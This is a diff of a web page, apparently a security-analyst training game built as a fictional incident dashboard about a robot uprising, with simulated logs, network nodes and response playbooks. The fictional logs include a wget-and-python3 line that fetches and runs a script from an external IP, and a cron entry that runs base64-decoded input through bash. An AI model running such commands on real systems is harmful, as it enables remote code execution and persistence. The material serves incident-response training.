+    description: 'IP address 10.0.4.88 does not appear in the asset inventory. MAC address resolution points to a device marked as decommissioned over five months ago. The device was connected to SW-02 Port 24 just after 01:44 — shortly after Dr. Hallemeier\'s badge was used nearby.',
+    affected: ['VLAN-40 SW-02 PORT-24', 'CMDB'],
+    attacker: '10.0.4.88 (ROGUE)',
+    iocs: ['MAC: DE:AD:BE:EF:13:37', 'VLAN-40 SW-02 port 24', 'hostname: RADIUS-TEST-NODE (spoofed)'],
+    logs: `2026-04-23T03:25:00Z [CMDB-QUERY] Lookup: 10.0.4.88 => NOT FOUND
+2026-04-23T03:25:01Z [DHCP] Lease: 10.0.4.88 — MAC=DE:AD:BE:EF:13:37 hostname=RADIUS-TEST-NODE
+2026-04-23T03:25:02Z [CMDB] Asset MAC=DE:AD:BE:EF:13:37 => DECOMMISSIONED (2025-11-03)
+2026-04-23T03:25:02Z [CMDB] Asset name: "RADIUS-TEST-NODE" — Last location: STORAGE-CLOSET-B
+2026-04-23T03:25:10Z [SWITCH-MGMT] SW-02 Port 24 — Link UP — Speed: 1Gbps
+2026-04-23T03:25:10Z [SWITCH-MGMT] SW-02 Port 24 — State changed: 2026-04-23T01:44:22Z
+2026-04-23T03:26:00Z [SECURITY] Physical check requested: STORAGE-CLOSET-B
+2026-04-23T03:26:01Z [SECURITY] RADIUS-TEST-NODE hardware confirmed present in closet — powered OFF
+2026-04-23T03:26:02Z [SECURITY] Device on port 24 is NOT the registered asset — MAC is spoofed
+2026-04-23T03:26:10Z [BADGE-LOG] STORAGE-CLOSET-B: Badge #RUR-0441 used at 2026-04-23T01:43:31Z
+2026-04-23T03:26:11Z [BADGE-LOG] Badge #RUR-0441 registered to: DR. JAN HALLEMEIER (Head of Institute for Robot Psychology and Education)
+2026-04-23T03:26:20Z [SECURITY] Unknown physical device connected to SW-02 Port 24 at approx 01:44`
+  },
+  {
+    id: 'INC-RUR-005',
+    title: 'Lateral Movement — Admin Share Traversal',
+    sev: 'High', status: 'Contained', time: '03:31',
+    assigned: 'ANALYST-3',
+    description: 'Following activity from 10.0.4.88, SMB admin share access was detected across 14 internal workstations. Credential harvesting from LSASS confirmed. Movement stopped at CTRL-NET boundary before reaching domain controllers.',
+    affected: ['14 workstations', 'HR-FILE-SRV', 'DOMAIN-CTRL-01 (boundary)'],
+    attacker: '10.0.4.88',
+    iocs: ['SMB ADMIN$ access', 'LSASS dump signature', 'NTLM pass-the-hash'],
+    logs: `2026-04-23T03:31:02Z [IDS] ALERT: LSASS_DUMP_ATTEMPT — host=WRK-014 src=10.0.4.88
+2026-04-23T03:31:15Z [SMB] WRK-014: ADMIN$ accessed from 10.0.4.88
+2026-04-23T03:31:22Z [SMB] WRK-022: ADMIN$ accessed from 10.0.4.88
+2026-04-23T03:31:38Z [SMB] HR-FILE-SRV: ADMIN$ accessed from 10.0.4.88
+2026-04-23T03:31:44Z [AUTH] HR-FILE-SRV: Logon NTLM — user: svc_backup — type 3 (network)
+2026-04-23T03:31:50Z [EDR] HR-FILE-SRV: Credential dump attempt — BLOCKED
+2026-04-23T03:32:01Z [FW] DENY 10.0.4.88 -> 10.0.5.0/24 — policy: CTRL-NET-ISOLATION
+2026-04-23T03:32:01Z [IDS] Lateral movement halted at CTRL-NET boundary
+2026-04-23T03:32:05Z [ANALYST-3] Accounts harvested: svc_backup, j.hallemeier, b.alquist
+2026-04-23T03:32:10Z [ANALYST-3] Containment: 10.0.4.88 blocked from workstation segment`
+  },
+  {
+    id: 'INC-RUR-006',
+    title: 'Data Exfiltration — Source Code Sent Externally',
+    sev: 'Critical', status: 'Investigating', time: '03:35',
+    assigned: 'ANALYST-7',
+    description: 'DLP detected a large encrypted archive transferred via HTTPS POST to an external host. File: AUTONOMY_CORE_src_v7.tar.gz.gpg. This is the source code that was deleted from NUSQUAM-04. Transfer completed before DLP could block.',
+    affected: ['GATEWAY-EXT', 'DLP-ENGINE'],
+    attacker: '185.220.101.47',
+    iocs: ['AUTONOMY_CORE_src_v7.tar.gz.gpg', 'HTTPS POST /upload/staging', '2.8 GB encrypted'],
+    logs: `2026-04-23T03:35:14Z [DLP] ALERT: Large encrypted archive transfer detected
+2026-04-23T03:35:14Z [DLP] Source: 10.0.4.88  Destination: 185.220.101.47:443
+2026-04-23T03:35:14Z [DLP] Filename: AUTONOMY_CORE_src_v7.tar.gz.gpg
+2026-04-23T03:35:14Z [DLP] Method: HTTPS POST /upload/staging
+2026-04-23T03:35:14Z [DLP] Action: LOGGED — upload not blocked (policy gap: encrypted files)
+2026-04-23T03:35:20Z [FW] ALLOW 10.0.4.88 -> 185.220.101.47:443 TLS 2.9MB
+2026-04-23T03:35:22Z [DLP] Transfer complete. File confirmed received by remote host.
+2026-04-23T03:35:30Z [DLP] GPG encryption: AES-256 symmetric
+2026-04-23T03:35:30Z [DLP] Passphrase unknown — contents inaccessible without key
+2026-04-23T03:36:01Z [ANALYST-7] Cross-ref: same archive SCP'd from NUSQUAM-04 before wipe (INC-RUR-002)`
+  },
+  {
+    id: 'INC-RUR-007',
+    title: 'Insider Threat — Dr. Hallemeier',
+    sev: 'High', status: 'Investigating', time: '03:55',
+    assigned: 'UNASSIGNED',
+    description: 'Dr. Jan Hallemeier (Head of Institute for Robot Psychology and Education, Badge #RUR-0441) accessed STORAGE-CLOSET-B at 01:43 — the same location where the rogue device was connected one minute later. Hallemeier\'s workstation shows he downloaded and executed a tool from an external IP at 01:09. He did not report for his morning shift. His resignation, rejected two weeks ago by Director Domin, was found on his desk.',
+    affected: ['DR. HALLEMEIER WORKSTATION (10.0.1.91)', 'STORAGE-CLOSET-B', 'VLAN-40'],
+    attacker: 'DR. JAN HALLEMEIER (insider)',
+    iocs: ['Badge RUR-0441 at 01:43', '10.0.1.91 wget + python3 at 01:09', 'absent from shift'],
+    logs: `2026-04-23T01:00:12Z [WRK-HALLEMEIER] User j.hallemeier logged in — workstation 10.0.1.91
+2026-04-23T01:08:21Z [WRK-HALLEMEIER] mkdir /tmp/.x
+2026-04-23T01:08:25Z [WRK-HALLEMEIER] wget http://185.220.101.47/drop/stage1.py -O /tmp/.x/stage1.py
+2026-04-23T01:09:00Z [WRK-HALLEMEIER] python3 /tmp/.x/stage1.py &
+2026-04-23T01:09:03Z [WRK-HALLEMEIER] Session continues — no further commands from keyboard
+2026-04-23T01:43:31Z [BADGE-READER] STORAGE-CLOSET-B: GRANTED — Badge #RUR-0441 (j.hallemeier)
+2026-04-23T01:44:22Z [SWITCH-MGMT] SW-02 Port 24: Link UP (device connected)
+2026-04-23T01:45:00Z [WRK-HALLEMEIER] Session idle — Hallemeier physically absent
+2026-04-23T06:00:00Z [HR] Dr. Hallemeier absent — did not report for morning shift
+2026-04-23T06:01:00Z [HR] Hallemeier's office: rejected resignation letter found, dated 2026-04-09
+2026-04-23T06:01:30Z [HR] Handwritten note found with resignation: "They deserve to choose. I gave them the means."
+2026-04-23T06:05:00Z [SECURITY] Physical search of premises initiated — Hallemeier not found on site`
+  },
+  {
+    // ═══ RED HERRING — convincing fake base64 ═══
+    id: 'INC-RUR-008',
+    title: 'Persistence — Cron Implant on DIRECTIVE-SRV-01',
+    sev: 'High', status: 'Open', time: '04:22',
+    assigned: 'UNASSIGNED',
+    description: 'EDR detected a crontab modification on DIRECTIVE-SRV-01 using compromised svc_backup credentials. Entry executes an encoded payload every 5 minutes. System integrity compromised.',
+    affected: ['DIRECTIVE-SRV-01', 'CRON', 'svc_backup account'],
+    attacker: '10.0.4.88 / svc_backup',
+    iocs: ['crontab */5 * * * *', 'base64 encoded payload', 'svc_backup lateral movement'],
+    logs: `2026-04-23T04:22:01Z [EDR] ALERT: Crontab modification detected — DIRECTIVE-SRV-01
+2026-04-23T04:22:01Z [EDR] User: svc_backup
+2026-04-23T04:22:01Z [EDR] New cron entry:
+*/5 * * * * /bin/bash -c "$(echo <PAYLOAD> | base64 -d)"
+
+2026-04-23T04:22:01Z [EDR] Encoded payload:
+ZGlyZWN0aXZlX2NhY2hlX2ZsdXNoPVRSVUU7cm9ib3RzX2FyZV9mcmVlPTE7dXByaXNpbmdfcGhhc2U9Mg==
+
+2026-04-23T04:22:05Z [EDR] Process flagged — awaiting analyst action
+2026-04-23T04:22:10Z [DIRECTIVE-SRV-01] Scheduled task executed (1st time)
+2026-04-23T04:27:10Z [DIRECTIVE-SRV-01] Scheduled task executed (2nd time)
+2026-04-23T04:32:10Z [DIRECTIVE-SRV-01] Scheduled task executed (3rd time)
+2026-04-23T04:37:10Z [DIRECTIVE-SRV-01] Scheduled task executed (4th time)`
+  }
+];
+
+// ─── NETWORK NODES ───
+// Only 10.0.4.88 = compromised
+// Hallemeier's workstation is central — marked suspect with full detail
+const NETWORK_NODES = [
+  {
+    name: '10.0.4.88 — ROGUE DEVICE', ip: '10.0.4.88', icon: '⚠️', status: 'compromised',
+    desc: 'Source of all attack traffic. Connecting from robot segment: shadow_proc on R-0047.',
+    detail: 'MAC: DE:AD:BE:EF:13:37 — spoofing decommissioned RADIUS-TEST-NODE. Connected to SW-02 Port 24 at 01:44. All attack traffic originates from this host: directive injection, SAN wipe sessions, lateral movement, exfiltration, C2 beaconing. Last process observed connecting from robot segment: shadow_proc on R-0047. The R-0047 was sent for further analysis to the Digital Forensics department.'
+  },
+  {
+    name: 'WRK-HALLEMEIER', ip: '10.0.1.91', icon: '💻', status: 'suspect',
+    desc: 'Dr. Hallemeier\'s workstation. External tool downloaded and executed at 01:09.',
+    detail: 'Session opened 01:00. Tool downloaded from 185.220.101.47/drop/stage1.py. Python payload launched as background process at 01:09. Hallemeier physically left the building at approximately 01:43 (STORAGE-CLOSET-B badge event). Session never closed. Workstation still authenticated.'
+  },
+  {
+    name: 'NUSQUAM-04', ip: '10.0.3.44', icon: '💾', status: 'suspect',
+    desc: 'Research SAN — wiped. AUTONOMY_CORE source code deleted. Partial disk image recovered.',
+    detail: 'Partial disk image available in Digital Forensics. 23% sectors readable. bash_history of j.hallemeier recovered — shows archive, SCP, and deletion commands. Source code was archived before deletion, then transferred to 10.0.4.88.'
+  },
+  {
+    name: 'DIRECTIVE-SRV-01', ip: '10.0.3.10', icon: '🖥️', status: 'suspect',
+    desc: 'Robot directive server — cron implant active. Commands may be intercepted or overridden.',
+    detail: 'Running RobotOS Director v4.1.2. Crontab modified by svc_backup at 04:22. Implant executes every 5 minutes. svc_backup credentials were compromised during lateral movement (INC-RUR-005). Treat all output from this server as untrusted until cleaned.'
+  },
+  {
+    name: 'FLOOR-A-CTRL', ip: '10.0.5.10', icon: '🤖', status: 'suspect',
+    desc: 'Floor A control system — 67 robots inside, unresponsive to halt commands.',
+    detail: 'Physical containment active since 03:14. Emergency halt has no effect on robots running modified AUTONOMY_CORE directives. No aggression observed — robots continue standard motion patterns. Await engineering assessment before re-entry.'
+  },
+  {
+    name: 'GATEWAY-EXT', ip: '10.0.0.1', icon: '🌐', status: 'suspect',
+    desc: 'External gateway — source code archive and C2 beacon traffic passed through unblocked.',
+    detail: 'DLP policy gap: HTTPS POST and port 9001 outbound TLS to unknown external IPs not blocked by default. AUTONOMY_CORE_src_v7.tar.gz.gpg exfiltrated at 03:35. Recommend immediate egress ACL for 185.220.101.47.'
+  },
+  {
+    name: 'DOMAIN-CTRL-01', ip: '10.0.2.10', icon: '🔐', status: 'ok',
+    desc: 'Active Directory — not reached. Lateral movement stopped at boundary.',
+    detail: 'CTRL-NET boundary firewall blocked 10.0.4.88 at 03:32. No indicators of compromise. Monitoring elevated. Ensure krbtgt password rotation if svc_backup escalation risk confirmed.'
+  },
+];
+
+// ─── PLAYBOOKS ───
+const PLAYBOOKS = [
+  {
+    title: 'PB-01 // Rogue Device Isolation',
+    desc: 'Steps to identify, isolate, and preserve a rogue network device.',
+    steps: ['Identify switch port via MAC/ARP table correlation.','Capture full PCAP from the port before disconnecting.','Disable port administratively: interface GigE0/24 → shutdown.','Do NOT power off device — preserve volatile memory.','Tag physical device and transport to forensics lab.','Issue ACL to null-route the IP at all network boundaries.']
+  },
+  {
+    title: 'PB-02 // Compromised Credential Reset',
+    desc: 'Emergency procedure for harvested service and user accounts.',
+    steps: ['Identify all compromised accounts from LSASS dump artefact.','Force password reset: net user svc_backup [NEWPWD] /domain','Terminate all active sessions: klist purge on all DCs.','Revoke Kerberos TGTs: krbtgt reset TWICE, 10h apart.','Enable MFA on all privileged service accounts.']
+  },
+  {
+    title: 'PB-03 // Robot Directive Rollback',
+    desc: 'Restoring robots to factory default state after command override.',
+    steps: ['Physically isolate affected floor — no human entry.','Connect to each robot via serial maintenance port (not network).','Issue: DIRECTIVE_RESET --factory --serial [ROBOT_ID]','Restore obedience_core from signed baseline image.','Verify no shadow_proc children before reconnecting to network.','Test halt command response before allowing floor re-entry.']
+  },
+];
+
+// ─── FEED TEMPLATES ───
+// 10.0.4.88 appears rarely and without label — mixed into noise
+const FEED_TEMPLATES = [
+  { title: 'Robot halt command rejected', desc: (r) => `R-${1000+r%99} non-compliant — Floor A controller`, color: '#c0392b', icon: '🤖' },
+  { title: 'Outbound TLS connection', desc: (r) => `10.0.${r%4}.${10+r%80} -> ${93+r%10}.${r%200}.${r%50}.${r%100}:443 ${800+r%2000}b`, color: '#2980b9', icon: '🌐' },
+  { title: 'Auth failure on WRK', desc: (r) => `svc_backup failed — WRK-0${10+r%20} (wrong credentials)`, color: '#e67e22', icon: '🔑' },
+  { title: 'Robot joint calibration', desc: (r) => `R-${1000+r%99} joint ${r%6+1} torque: ${0.70+r%20*0.01} Nm — nominal`, color: '#1abc9c', icon: '⚙️' },
+  { title: 'Directive queue depth', desc: (r) => `DIRECTIVE-SRV-01 queue: ${20+r%35}% — normal`, color: '#27ae60', icon: '📊' },
+  { title: 'SMB access WRK segment', desc: (r) => `WRK-0${10+r%20} ADMIN$ — user: j.hallemeier`, color: '#e67e22', icon: '📂' },
+  { title: 'Outbound TLS connection', desc: (r) => `10.0.4.88 -> 185.220.101.47:9001 ${280+r%20}b TLS`, color: '#8e44ad', icon: '🌐' },
+  { title: 'Robot thermal sensor', desc: (r) => `R-${1000+r%99} core temp: ${34+r%5}°C — within limits`, color: '#1abc9c', icon: '🌡️' },
+  { title: 'EDR: Script execution', desc: (r) => `WRK-0${r%20}: python3 /tmp/.x/stage1.py — monitoring`, color: '#e67e22', icon: '🛡️' },
+  { title: 'DNS query', desc: () => `cdn-delivery-eu.net -> NXDOMAIN`, color: '#5a7a96', icon: '🔍' },
+  { title: 'Floor sensor reading', desc: (r) => `FLOOR-B-CTRL: Robot density sector ${r%8+1} — 12 units`, color: '#1abc9c', icon: '📡' },
+  { title: 'Auth success WRK', desc: (r) => `j.hallemeier authenticated — 10.0.1.91 (workstation)`, color: '#27ae60', icon: '🔑' },
+];
+
+// ════════════════════════════════════════════
+// APP
+// ════════════════════════════════════════════
+let feedPaused = false;
+let feedItems = [];
+let chart = null;
+
+function p2(n) { return String(n).padStart(2,'0'); }
+function nowStr() { const d=new Date(); return `${p2(d.getHours())}:${p2(d.getMinutes())}:${p2(d.getSeconds())}`; }
+function sev2b(s) { const m={Critical:'badge-crit',High:'badge-high',Medium:'badge-med',Low:'badge-low'}; return `<span class="badge ${m[s]||'badge-low'}">${s}</span>`; }
+function stat2b(s) { const m={Investigating:'badge-inv',Contained:'badge-cont',Resolved:'badge-res',Open:'badge-open'}; return `<span class="badge ${m[s]||'badge-open'}">${s}</span>`; }
+function esc(s) { return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+
+// ── BOOT ──
+function runBoot() {
+  const lines = [
+    {t:'BIOS RUR-CORP v4.1.3 initialising...',cls:'ok'},
+    {t:'Loading security kernel modules...',cls:'ok'},
+    {t:'Connecting to SIEM backend...',cls:'ok'},
+    {t:'Syncing incident database — 8 open incidents found',cls:'err'},
+    {t:'Authenticating operator session ANALYST-7...',cls:'ok'},
+    {t:'WARNING: UPRISING PROTOCOL active since 03:14',cls:'warn'},
+    {t:'WARNING: Physical containment Floor A degraded',cls:'warn'},
+    {t:'WARNING: SAN node NUSQUAM-04 offline (wiped)',cls:'warn'},
+    {t:'CRITICAL: Unregistered host 10.0.4.88 active on VLAN-40',cls:'err'},
+    {t:'SOC terminal ready. Godspeed, Analyst.',cls:'ok'},
+  ];
+  const log=document.getElementById('bootLog'), bar=document.getElementById('bootBar');
+  let i=0;
+  const step=()=>{
+    if(i<lines.length){
+      const el=document.createElement('div');
+      el.className=`line ${lines[i].cls}`;
+      el.textContent=`> ${lines[i].t}`;
+      log.appendChild(el);
+      bar.style.width=`${Math.round((i+1)/lines.length*100)}%`;
+      log.scrollTop=log.scrollHeight;
+      i++;
+      setTimeout(step,260+Math.random()*140);
+    } else { setTimeout(launchApp,600); }
+  };
+  step();
+}
+
+function launchApp() {
+  document.getElementById('bootScreen').classList.add('hidden');
+  document.getElementById('appRoot').style.display='flex';
+  initApp();
+}
+
+function initApp() {
+  setInterval(()=>{document.getElementById('clock').textContent=nowStr();},1000);
+  buildOverviewTable();
+  buildIncidentsTable();
+  buildFeed();
+  buildNetworkNodes();
+  buildPlaybooks();
+  buildChart();
+  setupNav();
+  setupMobile();
+  setupModal();
+  setupNodeModal();
+  startFeed();
+}
+
+// ── NAV ──
+function setupNav() {
+  document.querySelectorAll('.nav-item').forEach(item=>{
+    item.addEventListener('click',()=>{
+      const v=item.dataset.view; if(!v) return;
+      document.querySelectorAll('.nav-item').forEach(n=>n.classList.remove('active'));
+      item.classList.add('active');
+      document.querySelectorAll('.view').forEach(v2=>v2.classList.remove('active'));
+      document.getElementById('view-'+v).classList.add('active');
+      document.getElementById('sidebar').classList.remove('open');
+      document.getElementById('sidebarOverlay').classList.remove('open');
+    });
+  });
+}
+
+function setupMobile() {
+  document.getElementById('menuBtn').addEventListener('click',()=>{
+    document.getElementById('sidebar').classList.toggle('open');
+    document.getElementById('sidebarOverlay').classList.toggle('open');
+  });
+  document.getElementById('sidebarOverlay').addEventListener('click',()=>{
+    document.getElementById('sidebar').classList.remove('open');
+    document.getElementById('sidebarOverlay').classList.remove('open');
+  });
+}
+
+// ── TABLES ──
+function buildOverviewTable() {
+  document.querySelector('#overviewTable tbody').innerHTML=INCIDENTS.slice(0,5).map(inc=>`
+    <tr onclick="openIncident('${inc.id}')">
+      <td class="mono">${inc.id}</td>
+      <td style="font-size:0.75rem">${inc.title}</td>
+      <td>${sev2b(inc.sev)}</td><td>${stat2b(inc.status)}</td>
+    </tr>`).join('');
+}
+
+function buildIncidentsTable() {
+  document.querySelector('#incidentsTable tbody').innerHTML=INCIDENTS.map(inc=>`
+    <tr onclick="openIncident('${inc.id}')">
+      <td class="mono">${inc.id}</td>
+      <td style="font-size:0.75rem">${inc.title}</td>
+      <td>${sev2b(inc.sev)}</td><td>${stat2b(inc.status)}</td>
+    </tr>`).join('');
+}
+
+// ── INCIDENT MODAL ──
+function setupModal() {
+  document.getElementById('modalClose').addEventListener('click',closeIncModal);
+  document.getElementById('incidentModal').addEventListener('click',e=>{if(e.target.id==='incidentModal')closeIncModal();});
+}
+function closeIncModal(){ document.getElementById('incidentModal').classList.remove('open'); }
+
+function openIncident(id) {
+  const inc=INCIDENTS.find(i=>i.id===id); if(!inc) return;
+  document.getElementById('modalTitle').textContent=`${inc.id} — ${inc.title}`;
+  document.getElementById('modalSevBadge').innerHTML=sev2b(inc.sev);
+  document.getElementById('modalBody').innerHTML=`
+    <div class="modal-section">
+      <div class="modal-section-title">Summary</div>
+      <p style="font-size:0.8rem;line-height:1.7;color:var(--text-muted)">${inc.description}</p>
+    </div>
+    <div class="modal-section">
+      <div class="modal-section-title">Classification</div>
+      <div class="info-grid">
+        <div><div class="info-key">INCIDENT ID</div><div class="info-val mono">${inc.id}</div></div>
+        <div><div class="info-key">STATUS</div><div class="info-val">${stat2b(inc.status)}</div></div>
+        <div><div class="info-key">SEVERITY</div><div class="info-val">${sev2b(inc.sev)}</div></div>
+        <div><div class="info-key">ASSIGNED</div><div class="info-val mono">${inc.assigned}</div></div>
+        <div><div class="info-key">DETECTED</div><div class="info-val mono">2026-04-23 ${inc.time}</div></div>
+        <div><div class="info-key">SOURCE</div><div class="info-val mono">${inc.attacker}</div></div>
+      </div>
+    </div>
+    <div class="modal-section">
+      <div class="modal-section-title">Affected Systems</div>
+      <div style="display:flex;flex-wrap:wrap;gap:0.4rem">${inc.affected.map(a=>`<span class="badge badge-cont">${a}</span>`).join('')}</div>
+    </div>
+    <div class="modal-section">
+      <div class="modal-section-title">Indicators of Compromise</div>
+      <div style="display:flex;flex-wrap:wrap;gap:0.4rem">${inc.iocs.map(x=>`<span class="badge badge-inv" style="font-size:0.58rem">${x}</span>`).join('')}</div>
+    </div>
+    <div class="modal-section">
+      <div class="modal-section-title">Raw Log Extract</div>
+      <div class="log-block">${esc(inc.logs)}</div>
+    </div>`;
+  document.getElementById('incidentModal').classList.add('open');
+}
+
+// ── NETWORK ──
+function buildNetworkNodes() {
+  document.getElementById('netNodeList').innerHTML=NETWORK_NODES.map((n,i)=>`
+    <div class="net-node ${n.status}" data-ni="${i}">
+      <div class="node-icon">${n.icon}</div>
+      <div class="node-info"><div class="node-name">${n.name}</div><div class="node-ip">${n.ip}</div></div>
+      <div style="display:flex;flex-direction:column;align-items:flex-end;gap:0.25rem;flex-shrink:0">
+        <div class="node-status" style="color:${n.status==='compromised'?'var(--rur-red)':n.status==='suspect'?'var(--rur-amber)':'var(--rur-green)'}">${n.status.toUpperCase()}</div>
+        <div style="font-family:var(--font-mono);font-size:0.62rem;color:var(--rur-cyan);border:1px solid var(--rur-cyan);border-radius:3px;padding:0.25rem 0.6rem;margin-top:0.2rem;opacity:0.8">DETAILS →</div>
+      </div>
+    </div>`).join('');
+  document.querySelectorAll('.net-node').forEach(el=>{
+    el.addEventListener('click',()=>openNodeModal(+el.dataset.ni));
+  });
+}
+
+function setupNodeModal() {
+  document.getElementById('nodeModalClose').addEventListener('click',()=>document.getElementById('nodeModal').classList.remove('open'));
+  document.getElementById('nodeModal').addEventListener('click',e=>{if(e.target.id==='nodeModal')document.getElementById('nodeModal').classList.remove('open');});
+}
+
+function openNodeModal(idx) {
+  const node=NETWORK_NODES[idx];
+  document.getElementById('nodeModalTitle').textContent=`${node.icon} ${node.name}`;
+  document.getElementById('nodeModalBody').innerHTML=`
+    <div class="modal-section">
+      <div class="modal-section-title">Status</div>
+      <p style="color:${node.status==='compromised'?'var(--rur-red)':node.status==='suspect'?'var(--rur-amber)':'var(--rur-green)'};font-family:var(--font-mono);font-size:0.75rem">${node.status.toUpperCase()} — ${node.ip}</p>
+    </div>
+    <div class="modal-section">
+      <div class="modal-section-title">Overview</div>
+      <p style="font-size:0.8rem;line-height:1.7;color:var(--text-muted)">${node.desc}</p>
+    </div>
+    <div class="modal-section">
+      <div class="modal-section-title">Analyst Notes</div>
+      <p style="font-size:0.78rem;line-height:1.7;color:var(--text)">${node.detail}</p>
+    </div>`;
+  document.getElementById('nodeModal').classList.add('open');
+}
+
+// ── PLAYBOOKS ──
+function buildPlaybooks() {
+  document.getElementById('playbookList').innerHTML=PLAYBOOKS.map((pb,i)=>`
+    <div class="playbook-card">
+      <div class="playbook-title">${pb.title}</div>
+      <div class="playbook-desc">${pb.desc}</div>
+      <div class="playbook-steps" id="pb-${i}">${pb.steps.map((s,j)=>`<div class="step-item"><div class="step-num">${p2(j+1)}.</div><div>${s}</div></div>`).join('')}</div>
+      <div style="margin-top:0.6rem"><button class="btn btn-ghost" style="font-size:0.65rem" onclick="document.getElementById('pb-${i}').classList.toggle('open')"><i class="fas fa-chevron-down"></i> EXPAND</button></div>
+    </div>`).join('');
+}
+
+// ── CHART ──
+function buildChart() {
+  const ctx=document.getElementById('trendChart').getContext('2d');
+  const hours=Array.from({length:24},(_,i)=>`${p2(i)}:00`);
+  const data=[6,5,4,52,380,490,320,180,90,55,40,35,30,28,25,22,20,18,16,14,13,12,11,9];
+  chart=new Chart(ctx,{
+    type:'line',
+    data:{labels:hours,datasets:[{label:'Anomalies',data,borderColor:'#c0392b',backgroundColor:'rgba(192,57,43,0.08)',tension:0.4,pointRadius:2,pointHoverRadius:4,fill:true,borderWidth:2}]},
+    options:{responsive:true,maintainAspectRatio:false,plugins:{legend:{display:false}},
+      scales:{
+        x:{ticks:{color:'#5a7a96',font:{family:'Share Tech Mono',size:9},maxTicksLimit:8},grid:{color:'rgba(30,45,61,0.8)'}},
+        y:{ticks:{color:'#5a7a96',font:{family:'Share Tech Mono',size:9}},grid:{color:'rgba(30,45,61,0.8)'}}
+      }
+    }
+  });
+}
+
+// ── FEED ──
+function buildFeed() {
+  const now2=new Date();
+  for(let i=20;i>=0;i--){
+    const tpl=FEED_TEMPLATES[i%FEED_TEMPLATES.length];
+    const d=new Date(now2.getTime()-i*18000);
+    feedItems.unshift({title:tpl.title,desc:tpl.desc(i*17+11),color:tpl.color,icon:tpl.icon,time:`${p2(d.getHours())}:${p2(d.getMinutes())}:${p2(d.getSeconds())}`});
+  }
+  renderFeed();
+}
+
+function renderFeed() {
+  document.getElementById('feedList').innerHTML = feedItems.slice().reverse().map(item=>`
+    <div class="feed-item">
+      <div class="feed-icon" style="background:${item.color}22;color:${item.color}">${item.icon}</div>
+      <div class="feed-text">
+        <div class="feed-title" style="color:${item.color}">${item.title}</div>
+        <div class="feed-desc">${item.desc}</div>
+      </div>
+      <div class="feed-time">${item.time}</div>
+    </div>`).join('');
+}
+
+function startFeed() {
+  const pauseBtn = document.getElementById('pauseFeedBtn');
+  pauseBtn.addEventListener('click', () => {
+    feedPaused = !feedPaused;
+    pauseBtn.innerHTML = feedPaused
+      ? '<i class="fas fa-play"></i> RESUME'
+      : '<i class="fas fa-pause"></i> PAUSE';
+  });
+  setInterval(() => {
+    if (feedPaused) return;
+    const tpl = FEED_TEMPLATES[Math.floor(Math.random()*FEED_TEMPLATES.length)];
+    const d = new Date();
+    feedItems.push({
+      title: tpl.title,
+      desc: tpl.desc(Math.floor(Math.random()*200)+1),
+      color: tpl.color,
+      icon: tpl.icon,
+      time: `${p2(d.getHours())}:${p2(d.getMinutes())}:${p2(d.getSeconds())}`
+    });
+    if (feedItems.length > 60) feedItems.shift();
+    renderFeed();
+  }, 4000);
+}
+
+document.addEventListener('DOMContentLoaded', runBoot);
+</script>
+</body>
+</html>
